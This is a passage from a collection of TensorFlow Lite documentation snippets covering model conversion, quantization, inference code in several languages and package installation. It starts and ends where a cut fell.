DESCRIPTION: Class method to create an ImageDataLoader by loading images from a specified folder structure, where subdirectories represent class labels. It analyzes images with labels and supports shuffling the data.

Args:
  filename: Name of the folder containing the image data organized by subdirectories.
  shuffle: boolean, if True, randomly shuffles data.

Returns:
  ImageDataset containing images, labels, and other related information.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/DataLoader.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
from_folder(
    filename, shuffle=True
)
```

----------------------------------------

TITLE: Creating TFLiteConverter from Keras Model (Python)
DESCRIPTION: This class method provides a straightforward way to obtain a `TFLiteConverter` object from a TensorFlow Keras model (`tf.keras.Model`). Simply pass the Keras model instance as the argument. The method returns a `TFLiteConverter` configured for the provided Keras model, streamlining the conversion process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_8

LANGUAGE: Python
CODE:
```
@classmethod
from_keras_model(
    model
)
```

----------------------------------------

TITLE: Installing TensorFlow Lite Support Python Package
DESCRIPTION: Install the required `tflite-support` package using the pip package manager from the command line. This package provides the Task Library APIs necessary for using the ObjectDetector in Python.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/object_detector.md#_snippet_5

LANGUAGE: shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Update CocoaPods Dependencies (Shell)
DESCRIPTION: Runs the `pod update` command from the root directory of an iOS project to update dependencies according to the Podfile, including fetching local pods specified by `:path`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/build_ios.md#_snippet_9

LANGUAGE: Shell
CODE:
```
$ pod update
```

----------------------------------------

TITLE: Running TFLite Model Inference and Decoding Python
DESCRIPTION: This code loads the converted TFLite model into a `tf.lite.Interpreter`, allocates tensors for input/output, sets the input tensor with the preprocessed image data, and invokes the interpreter to run inference. It then retrieves the output tensor, decodes the predictions using the Keras function (which works on the output structure), and prints the predicted class.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/keras/keras_jax_backend_to_tfl.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()

input_details = interpreter.get_input_details()[0]
interpreter.set_tensor(input_details["index"], input_data)
interpreter.invoke()

output_details = interpreter.get_output_details()
output_data = interpreter.get_tensor(output_details[0]["index"])

tfl_predicted_class_idx = keras.applications.resnet.decode_predictions(
    output_data, top=1
)[0][0]
print("Predicted class:", tfl_predicted_class_idx[1])
```

----------------------------------------

TITLE: Distributing Keras compile/fit with MirroredStrategy (GPU) - Python
DESCRIPTION: This snippet demonstrates how to use tf.distribute.MirroredStrategy for distributing training of a Keras model across multiple GPUs using the standard compile and fit methods. It shows creating the strategy, defining the model within the strategy's scope, and then training the model with a dataset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/distribute/README.md#_snippet_0

LANGUAGE: python
CODE:
```
# Create the strategy instance. It will automatically detect all the GPUs.
mirrored_strategy = tf.distribute.MirroredStrategy()

# Create and compile the keras model under strategy.scope()
with mirrored_strategy.scope():
  model = tf.keras.Sequential([tf.keras.layers.Dense(1, input_shape=(1,))])
  model.compile(loss='mse', optimizer='sgd')

# Call model.fit and model.evaluate as before.
dataset = tf.data.Dataset.from_tensors(([1.], [1.])).repeat(100).batch(10)
model.fit(dataset, epochs=2)
model.evaluate(dataset)
```

----------------------------------------

TITLE: Installing TensorFlow Lite Support Library in Python
DESCRIPTION: This command demonstrates how to install the `tflite-support` pip package, which is required to use the TensorFlow Lite Task Library, including the ImageSegmenter API, in Python.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_segmenter.md#_snippet_5

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Running TFLite Super Resolution Inference (Python)
DESCRIPTION: Reads the downloaded JPEG image file, decodes it, and preprocesses it to match the TFLite model's expected input shape (batch of 1) and data type (float32). It then loads the saved TFLite model, allocates tensors, sets the preprocessed image data as the input tensor, invokes the interpreter to run inference, and retrieves the resulting high-resolution image data from the output tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/super_resolution/overview.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
lr = tf.io.read_file(test_img_path)
lr = tf.image.decode_jpeg(lr)
lr = tf.expand_dims(lr, axis=0)
lr = tf.cast(lr, tf.float32)

# Load TFLite model and allocate tensors.
interpreter = tf.lite.Interpreter(model_path=esrgan_model_path)
interpreter.allocate_tensors()

# Get input and output tensors.
input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()

# Run the model
interpreter.set_tensor(input_details[0]['index'], lr)
interpreter.invoke()

# Extract the output and postprocess it
output_data = interpreter.get_tensor(output_details[0]['index'])
sr = tf.squeeze(output_data, axis=0)
sr = tf.clip_by_value(sr, 0, 255)
sr = tf.round(sr)
sr = tf.cast(sr, tf.uint8)
```

----------------------------------------

TITLE: Creating Image Classifier Detailed Process Python
DESCRIPTION: Creates a custom image classifier model using image_classifier.create, specifying both the training and validation datasets. This allows the model's performance to be monitored on a separate validation set during training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
model = image_classifier.create(train_data, validation_data=validation_data)
```

----------------------------------------

TITLE: Visualizing Confusion Matrix for TFLite Model Python
DESCRIPTION: Defines a helper function to plot a confusion matrix using `seaborn` and `matplotlib`. It then calculates the confusion matrix for the trained model on the test data and visualizes it to understand classification performance per class. Requires the trained `model`, `test_data`, `seaborn` (sns), and `matplotlib.pyplot` (plt).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
def show_confusion_matrix(confusion, test_labels):
  """Compute confusion matrix and normalize."""
  confusion_normalized = confusion.astype("float") / confusion.sum(axis=1)
  axis_labels = test_labels
  ax = sns.heatmap(
      confusion_normalized, xticklabels=axis_labels, yticklabels=axis_labels,
      cmap='Blues', annot=True, fmt='.2f', square=True)
  plt.title("Confusion matrix")
  plt.ylabel("True label")
  plt.xlabel("Predicted label")

confusion_matrix = model.confusion_matrix(test_data)
show_confusion_matrix(confusion_matrix.numpy(), test_data.index_to_label)
```

----------------------------------------

TITLE: Define TFLite Runtime Runner Python
DESCRIPTION: This Python function `run_tflite_model` takes the TFLite model content and an input tensor, loads the model into a `tf.lite.Interpreter`, allocates tensors, sets the input tensor using the input details, invokes the interpreter to run inference, and returns the output tensor from the output details. This function abstracts the standard TFLite runtime inference process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/jax_to_tflite_resnet50.ipynb#_snippet_10

LANGUAGE: python
CODE:
```
def run_tflite_model(tflite_model_content, input_tensor):
  interpreter = tf.lite.Interpreter(model_content=tflite_model_content)
  interpreter.allocate_tensors()

  input_details = interpreter.get_input_details()[0]
  interpreter.set_tensor(input_details["index"], input_tensor)
  interpreter.invoke()

  output_details = interpreter.get_output_details()
  return interpreter.get_tensor(output_details[0]["index"])
```

----------------------------------------

TITLE: Printing Model Summary Python
DESCRIPTION: Prints a summary of the customized TensorFlow model's architecture, including layer names, output shapes, and the number of parameters. This helps understand the structure of the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
model.summary()
```

----------------------------------------

TITLE: Running Inference on Default TFLite Model (Single Image) Python
DESCRIPTION: Selects the first image from the test set, prepares it as input for the interpreter, sets the input tensor, invokes the interpreter to perform inference, and retrieves the prediction results from the output tensor.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_11

LANGUAGE: python
CODE:
```
test_image = np.expand_dims(test_images[0], axis=0).astype(np.float32)

input_index = interpreter.get_input_details()[0]["index"]
output_index = interpreter.get_output_details()[0]["index"]

interpreter.set_tensor(input_index, test_image)
interpreter.invoke()
predictions = interpreter.get_tensor(output_index)
```

----------------------------------------

TITLE: Extracting and Passing Image Data for Detection - TensorFlow Lite - Kotlin
DESCRIPTION: This function takes an ImageProxy from the camera, copies the image data (specifically the RGB bits from the first plane) into a shared Bitmap buffer using the `copyPixelsFromBuffer` method. It then extracts the rotation information from the image metadata and passes both the prepared bitmap buffer and the rotation degrees to an objectDetectorHelper instance to perform the actual detection.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/quickstart.md#_snippet_11

LANGUAGE: Kotlin
CODE:
```
private fun detectObjects(image: ImageProxy) {
    // Copy out RGB bits to the shared bitmap buffer
    image.use { bitmapBuffer.copyPixelsFromBuffer(image.planes[0].buffer) }
    val imageRotation = image.imageInfo.rotationDegrees
    objectDetectorHelper.detect(bitmapBuffer, imageRotation)
}
```

----------------------------------------

TITLE: Running Multiple TensorFlow Lite Micro Inferences (C++)
DESCRIPTION: Demonstrates running the inference loop multiple times. For each iteration, it sets a new input value, invokes the interpreter, reads the output value, and asserts that the output is close to an expected value based on the new input.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_18

LANGUAGE: C++
CODE:
```
input->data.f[0] = 1.;
interpreter.Invoke();
value = output->data.f[0];
TF_LITE_MICRO_EXPECT_NEAR(0.841, value, 0.05);

input->data.f[0] = 3.;
interpreter.Invoke();
value = output->data.f[0];
TF_LITE_MICRO_EXPECT_NEAR(0.141, value, 0.05);

input->data.f[0] = 5.;
interpreter.Invoke();
value = output->data.f[0];
TF_LITE_MICRO_EXPECT_NEAR(-0.959, value, 0.05);
```

----------------------------------------

TITLE: Running Initial Model Training Loop (Python)
DESCRIPTION: Executes the initial training phase for the defined `Model` instance using the preprocessed Fashion MNIST training data. It configures a `tf.data.Dataset` for batching and iterates through a specified number of epochs, applying the model's `train` signature function to update weights.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
NUM_EPOCHS = 100
BATCH_SIZE = 100
epochs = np.arange(1, NUM_EPOCHS + 1, 1)
losses = np.zeros([NUM_EPOCHS])
m = Model()

train_ds = tf.data.Dataset.from_tensor_slices((train_images, train_labels))
train_ds = train_ds.batch(BATCH_SIZE)

for i in range(NUM_EPOCHS):
  for x,y in train_ds:
    result = m.train(x, y)

  losses[i] = result['loss']
  if (i + 1) % 10 == 0:
    print(f"Finished {i+1} epochs")
    print(f"  loss: {losses[i]:.3f}")
```

----------------------------------------

TITLE: Initializing TFLite Interpreter with Metal Delegate - Swift
DESCRIPTION: Initialize the TensorFlow Lite Interpreter in Swift to utilize the GPU delegate. This requires importing the TensorFlowLite module, creating an instance of `MetalDelegate`, and passing it within an array to the `delegates` parameter when initializing the `Interpreter`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_1

LANGUAGE: Swift
CODE:
```
import TensorFlowLite

// Load model ...

// Initialize TensorFlow Lite interpreter with the GPU delegate.
let delegate = MetalDelegate()
if let interpreter = try Interpreter(modelPath: modelPath,
                                      delegates: [delegate]) {
  // Run inference ...
}
```

----------------------------------------

TITLE: Preprocess Image and Run Inference - TFLite Task Vision Kotlin
DESCRIPTION: This Kotlin snippet shows the steps to prepare an image for inference with a TFLite Vision object detector. It includes building an ImageProcessor to handle rotation and then using the processor and detector to get results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/java.md#_snippet_3

LANGUAGE: Kotlin
CODE:
```
val imageProcessor = ImageProcessor.Builder().add(Rot90Op(-imageRotation / 90)).build()
val tensorImage = imageProcessor.process(TensorImage.fromBitmap(image))
val results = objectDetector?.detect(tensorImage)
```

----------------------------------------

TITLE: Converting Keras Model with Full Integer Quantization TFLite Python
DESCRIPTION: Defines a representative dataset generator, initializes the converter, sets default optimizations and the representative dataset. Crucially, it sets `target_spec.supported_ops` to `[tf.lite.OpsSet.TFLITE_BUILTINS_INT8]` and `inference_input_type`/`inference_output_type` to `tf.uint8` to enforce end-to-end integer quantization and strict adherence to supported INT8 operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
def representative_data_gen():
  for input_value in tf.data.Dataset.from_tensor_slices(train_images).batch(1).take(100):
    yield [input_value]

converter = tf.lite.TFLiteConverter.from_keras_model(model)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.representative_dataset = representative_data_gen
# Ensure that if any ops can't be quantized, the converter throws an error
converter.target_spec.supported_ops = [tf.lite.OpsSet.TFLITE_BUILTINS_INT8]
# Set the input and output tensors to uint8 (APIs added in r2.3)
converter.inference_input_type = tf.uint8
converter.inference_output_type = tf.uint8

tflite_model_quant = converter.convert()
```

----------------------------------------

TITLE: Example Running SignatureDef TensorFlow Lite Python
DESCRIPTION: Illustrates the typical workflow for running inference using a SignatureDef: initialize the interpreter, allocate tensors, get the signature runner by name, and call the runner with input tensors provided as keyword arguments, then print the output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_10

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_content=tflite_model)
interpreter.allocate_tensors()
fn = interpreter.get_signature_runner('div_with_remainder')
output = fn(x=np.array([3]), y=np.array([2]))
print(output)
# {
#   'quotient': array([1.], dtype=float32)
#   'remainder': array([1.], dtype=float32)
```

----------------------------------------

TITLE: Loading TFLite Model and Running Inference Java
DESCRIPTION: This Java snippet shows the process of loading a TensorFlow Lite model file (e.g., 'mobilenet_v1_1.0_224_quant.tflite') from the application's assets into a `MappedByteBuffer`. It then initializes a TFLite `InterpreterApi` instance using a factory and runs the model inference by passing the input buffer's data and the output buffer's data to the interpreter's `run` method, wrapped in a try-catch block for error handling.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/lite_support.md#_snippet_4

LANGUAGE: Java
CODE:
```
import java.nio.MappedByteBuffer;
import org.tensorflow.lite.InterpreterFactory;
import org.tensorflow.lite.InterpreterApi;

try{
    MappedByteBuffer tfliteModel
        = FileUtil.loadMappedFile(activity,
            "mobilenet_v1_1.0_224_quant.tflite");
    InterpreterApi tflite = new InterpreterFactory().create(
        tfliteModel, new InterpreterApi.Options());
} catch (IOException e){
    Log.e("tfliteSupport", "Error reading model", e);
}

// Running inference
if(null != tflite) {
    tflite.run(tImage.getBuffer(), probabilityBuffer.getBuffer());
}
```

----------------------------------------

TITLE: Install TFLite Support Package Shell
DESCRIPTION: Shows the command-line instruction using pip to install the necessary `tflite-support` Python package. This package provides the Python API for using the TensorFlow Lite Task Library, including the ImageSearcher.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_searcher.md#_snippet_3

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Running Basic TFLite Inference Python
DESCRIPTION: Demonstrates the core steps for running inference with a loaded TFLite model. It shows how to get input/output tensor details, prepare random input data, set the input tensor, invoke the interpreter, and retrieve the output tensor data. Requires a loaded 'interpreter' object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_18

LANGUAGE: python
CODE:
```
# Get input and output tensors.
input_details = interpreter.get_input_details()
output_details = interpreter.get_output_details()

# Test the model on random input data.
input_shape = input_details[0]['shape']
input_data = np.array(np.random.random_sample(input_shape), dtype=np.float32)
interpreter.set_tensor(input_details[0]['index'], input_data)

interpreter.invoke()

# The function `get_tensor()` returns a copy of the tensor data.
# Use `tensor()` in order to get a pointer to the tensor.
output_data = interpreter.get_tensor(output_details[0]['index'])
print(output_data)
```

----------------------------------------

TITLE: Install TFLite Support Package (Shell)
DESCRIPTION: Use this command to install the `tflite-support` Python package using the pip package installer. This provides access to the metadata writers and the Task Library for TensorFlow Lite.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support.md#_snippet_0

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Modifying Python List in AutoGraph Loop Error Python
DESCRIPTION: Shows the AutoGraph equivalent of the illegal Python list modification. Appending to a Python list (`l`) inside a `for` loop over `tf.range` (which AutoGraph converts to a `tf.while_loop`) results in an illegal tensor capture error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_26

LANGUAGE: Python
CODE:
```
l = []
for i in tf.range(10):
  l.append(i)  # Error -- illegal tensor capture!
```

----------------------------------------

TITLE: Loading TFLite Model with C++ FlatBufferModel
DESCRIPTION: Shows the static methods of the C++ `FlatBufferModel` class used to load a TFLite model. Models can be loaded either directly from a file path or from a pre-loaded memory buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/inference.md#_snippet_14

LANGUAGE: C++
CODE:
```
class FlatBufferModel {
 Â // Build a model based on a file. Return a nullptr in case of failure.
 Â static std::unique_ptr<FlatBufferModel> BuildFromFile(
 Â Â Â Â Â const char* filename,
 Â Â Â Â Â ErrorReporter* error_reporter);

 Â // Build a model based on a pre-loaded flatbuffer. The caller retains
 Â // ownership of the buffer and should keep it alive until the returned object
 Â // is destroyed. Return a nullptr in case of failure.
 Â static std::unique_ptr<FlatBufferModel> BuildFromBuffer(
 Â Â Â Â Â const char* buffer,
 Â Â Â Â Â size_t buffer_size,
 Â Â Â Â Â ErrorReporter* error_reporter);
};
```

----------------------------------------

TITLE: Create TensorFlow Lite Image Embedder from Options Python
DESCRIPTION: Instantiates an `ImageEmbedder` using provided image embedder options. Takes an `ImageEmbedderOptions` object. Returns the configured `ImageEmbedder` instance or throws an error if options are invalid (ValueError) or creation fails (RuntimeError).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/vision/ImageEmbedder.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: tflite_support.task.vision.ImageEmbedderOptions
) -> 'ImageEmbedder'
```

----------------------------------------

TITLE: Initialize and Run Image Embedding in Python
DESCRIPTION: This Python snippet shows how to initialize the ImageEmbedder from a file, load images using TensorImage, perform embedding inference on two images, and calculate the cosine similarity between the resulting feature vectors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_embedder.md#_snippet_2

LANGUAGE: Python
CODE:
```
from tflite_support.task import vision

# Initialization.
image_embedder = vision.ImageEmbedder.create_from_file(model_path)

# Run inference on two images.
image_1 = vision.TensorImage.create_from_file('/path/to/image1.jpg')
result_1 = image_embedder.embed(image_1)
image_2 = vision.TensorImage.create_from_file('/path/to/image2.jpg')
result_2 = image_embedder.embed(image_2)

# Compute cosine similarity.
feature_vector_1 = result_1.embeddings[0].feature_vector
feature_vector_2 = result_2.embeddings[0].feature_vector
similarity = image_embedder.cosine_similarity(
    result_1.embeddings[0].feature_vector, result_2.embeddings[0].feature_vector)
```

----------------------------------------

TITLE: Running TFLite Model Inference - Java (Android)
DESCRIPTION: Shows the Java implementation for performing inference using the `infer` signature on a TFLite `Interpreter` in an Android app. It prepares direct `FloatBuffer` instances for input and output, runs the signature, and then includes example logic to process the raw float output buffer to determine the predicted class index for each item by finding the maximum value's index. It uses a `try-with-resources` block for proper resource management.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_25

LANGUAGE: Java
CODE:
```
try (Interpreter anotherInterpreter = new Interpreter(modelBuffer)) {
        // Restore the weights from the checkpoint file.

        int NUM_TESTS = 10;
        FloatBuffer testImages = FloatBuffer.allocateDirect(NUM_TESTS * 28 * 28).order(ByteOrder.nativeOrder());
        FloatBuffer output = FloatBuffer.allocateDirect(NUM_TESTS * 10).order(ByteOrder.nativeOrder());

        // Fill the test data.

        // Run the inference.
        Map<String, Object> inputs = new HashMap<>();
        inputs.put("x", testImages.rewind());
        Map<String, Object> outputs = new HashMap<>();
        outputs.put("output", output);
        anotherInterpreter.runSignature(inputs, outputs, "infer");
        output.rewind();

        // Process the result to get the final category values.
        int[] testLabels = new int[NUM_TESTS];
        for (int i = 0; i < NUM_TESTS; ++i) {
            int index = 0;
            for (int j = 1; j < 10; ++j) {
                if (output.get(i * 10 + index) < output.get(i * 10 + j)) index = testLabels[j];
            }
            testLabels[i] = index;
        }
    }
```

----------------------------------------

TITLE: Getting NumPy View of TFLite Tensor Buffer (Python)
DESCRIPTION: Returns a function that, when called, provides a NumPy view directly into the internal buffer of a specified tensor (input or output). This avoids data copying for reading and writing but requires careful handling to avoid holding the view across `allocate_tensors()` or `invoke()` calls, which can invalidate it.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_18

LANGUAGE: python
CODE:
```
tensor(
    tensor_index
)
```

----------------------------------------

TITLE: Importing Core Libraries Python
DESCRIPTION: This snippet imports the fundamental libraries required for numerical operations (NumPy) and building/training the machine learning model (TensorFlow). These imports are essential prerequisites for defining, compiling, and using Keras models and TensorFlow utilities later in the script.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/examples/experimental_new_converter/Keras_LSTM_fusion_Codelab.ipynb#_snippet_1

LANGUAGE: Python
CODE:
```
import numpy as np
import tensorflow as tf
```

----------------------------------------

TITLE: Create Standalone TFLite Interpreter with GPU (Kotlin)
DESCRIPTION: Initializes a `CompatibilityList` to check for GPU support on the device. If GPU is supported, it creates a `GpuDelegate` with the best available options and adds it to the `Interpreter.Options`; otherwise, it sets the number of threads. Finally, it initializes a standalone `Interpreter` with these options and includes placeholders for running inference. Requires standalone TFLite dependencies and a loaded `model`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu.md#_snippet_6

LANGUAGE: Kotlin
CODE:
```
import org.tensorflow.lite.Interpreter
      import org.tensorflow.lite.gpu.CompatibilityList
      import org.tensorflow.lite.gpu.GpuDelegate

      val compatList = CompatibilityList()

      val options = Interpreter.Options().apply{
          if(compatList.isDelegateSupportedOnThisDevice){
              // if the device has a supported GPU, add the GPU delegate
              val delegateOptions = compatList.bestOptionsForThisDevice
              this.addDelegate(GpuDelegate(delegateOptions))
          } else {
              // if the GPU is not supported, run on 4 threads
              this.setNumThreads(4)
          }
      }

      val interpreter = Interpreter(model, options)

      // Run inference
      writeToInput(input)
      interpreter.run(input, output)
      readFromOutput(output)
```

----------------------------------------

TITLE: Getting Input Tensor Details TensorFlow Lite Python
DESCRIPTION: Retrieves a list of dictionaries, where each dictionary provides comprehensive details about a specific input tensor of the model. This includes information such as the tensor's name, index, shape, data type, and quantization parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_5

LANGUAGE: python
CODE:
```
get_input_details()
```

----------------------------------------

TITLE: Running Audio Classification Inference in Android Java
DESCRIPTION: This Java snippet demonstrates initializing the AudioClassifier with options (e.g., GPU usage, max results), creating and starting an AudioRecord, loading audio samples into a TensorAudio, and performing classification inference. It requires the AudioClassifier and related Task Library dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/audio_classifier.md#_snippet_1

LANGUAGE: Java
CODE:
```
// Initialization
AudioClassifierOptions options =
    AudioClassifierOptions.builder()
        .setBaseOptions(BaseOptions.builder().useGpu().build())
        .setMaxResults(1)
        .build();
AudioClassifier classifier =
    AudioClassifier.createFromFileAndOptions(context, modelFile, options);

// Start recording
AudioRecord record = classifier.createAudioRecord();
record.startRecording();

// Load latest audio samples
TensorAudio audioTensor = classifier.createInputTensorAudio();
audioTensor.load(record);

// Run inference
List<Classifications> results = audioClassifier.classify(audioTensor);
```

----------------------------------------

TITLE: Initialize and Search with TFLite TextSearcher (Java)
DESCRIPTION: Demonstrates the Java API for initializing the `TextSearcher` with options (such as enabling GPU usage and L2 normalization for embeddings) and performing a semantic search query against a given text string. Requires a pre-built TFLite searcher model file (`modelFile`) and Android context.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/text_searcher.md#_snippet_1

LANGUAGE: Java
CODE:
```
// Initialization
TextSearcherOptions options =
    TextSearcherOptions.builder()
        .setBaseOptions(BaseOptions.builder().useGpu().build())
        .setSearcherOptions(
            SearcherOptions.builder().setL2Normalize(true).build())
        .build();
TextSearcher textSearcher =
    textSearcher.createFromFileAndOptions(context, modelFile, options);

// Run inference
List<NearestNeighbor> results = textSearcher.search(text);
```

----------------------------------------

TITLE: Importing TensorFlow Library Python
DESCRIPTION: Imports the main TensorFlow library under the standard alias `tf`. This is a necessary first step to access any TensorFlow functionalities, including those related to model authoring and TensorFlow Lite.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf
```

----------------------------------------

TITLE: Exporting Default TFLite Model - TensorFlow Lite Model Maker - Python
DESCRIPTION: Exports the trained model to TensorFlow Lite format with embedded metadata (labels and vocab). The default filename is `model.tflite` in the specified directory. This uses the default dynamic range quantization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_19

LANGUAGE: python
CODE:
```
model.export(export_dir='mobilebert/')
```

----------------------------------------

TITLE: Download Dataset Python
DESCRIPTION: Downloads the 'birds_dataset.zip' file from a Google Cloud Storage URL using `tf.keras.utils.get_file`. It caches the downloaded file in a './dataset' subdirectory and automatically extracts its contents.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
birds_dataset_folder = tf.keras.utils.get_file('birds_dataset.zip',
                                                'https://storage.googleapis.com/laurencemoroney-blog.appspot.com/birds_dataset.zip',
                                                cache_dir='./',
                                                cache_subdir='dataset',
                                                extract=True)
```

----------------------------------------

TITLE: Converting Keras Model to TFLite in Python
DESCRIPTION: Demonstrates how to create a simple Keras sequential model, compile and train it, and then convert it into the TensorFlow Lite format using `tf.lite.TFLiteConverter.from_keras_model()`. The resulting `tflite_model` variable contains the TFLite model content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_1

LANGUAGE: python
CODE:
```
x = np.array([[1.], [2.]])
y = np.array([[2.], [4.]])
model = tf.keras.models.Sequential([
          tf.keras.layers.Dropout(0.2),
          tf.keras.layers.Dense(units=1, input_shape=[1])
        ])
model.compile(optimizer='sgd', loss='mean_squared_error')
model.fit(x, y, epochs=1)
converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Training MNIST Model for TFLite Conversion Python
DESCRIPTION: Loads and preprocesses the MNIST dataset, defines a simple convolutional Keras model for digit classification, compiles it with Adam optimizer and sparse categorical crossentropy loss, and trains the model for one epoch on the training data.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_2

LANGUAGE: python
CODE:
```
# Load MNIST dataset
mnist = keras.datasets.mnist
(train_images, train_labels), (test_images, test_labels) = mnist.load_data()

# Normalize the input image so that each pixel value is between 0 to 1.
train_images = train_images / 255.0
test_images = test_images / 255.0

# Define the model architecture
model = keras.Sequential([
  keras.layers.InputLayer(input_shape=(28, 28)),
  keras.layers.Reshape(target_shape=(28, 28, 1)),
  keras.layers.Conv2D(filters=12, kernel_size=(3, 3), activation=tf.nn.relu),
  keras.layers.MaxPooling2D(pool_size=(2, 2)),
  keras.layers.Flatten(),
  keras.layers.Dense(10)
])

# Train the digit classification model
model.compile(optimizer='adam',
              loss=keras.losses.SparseCategoricalCrossentropy(from_logits=True),
              metrics=['accuracy'])
model.fit(
  train_images,
  train_labels,
  epochs=1,
  validation_data=(test_images, test_labels)
)
```

----------------------------------------

TITLE: Loading and Validating TFLite Micro Model (C++)
DESCRIPTION: Loads the TensorFlow Lite model from the `g_model` byte array using `tflite::GetModel`. It then checks if the model's schema version is compatible with the version supported by the library (`TFLITE_SCHEMA_VERSION`), reporting an error if they don't match.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_5

LANGUAGE: C++
CODE:
```
const tflite::Model* model = ::tflite::GetModel(g_model);
if (model->version() != TFLITE_SCHEMA_VERSION) {
  TF_LITE_REPORT_ERROR(error_reporter,
      "Model provided is schema version %d not equal "
      "to supported version %d.\n",
      model->version(), TFLITE_SCHEMA_VERSION);
}
```

----------------------------------------

TITLE: Running BertQuestionAnswerer Prediction in Android (Kotlin)
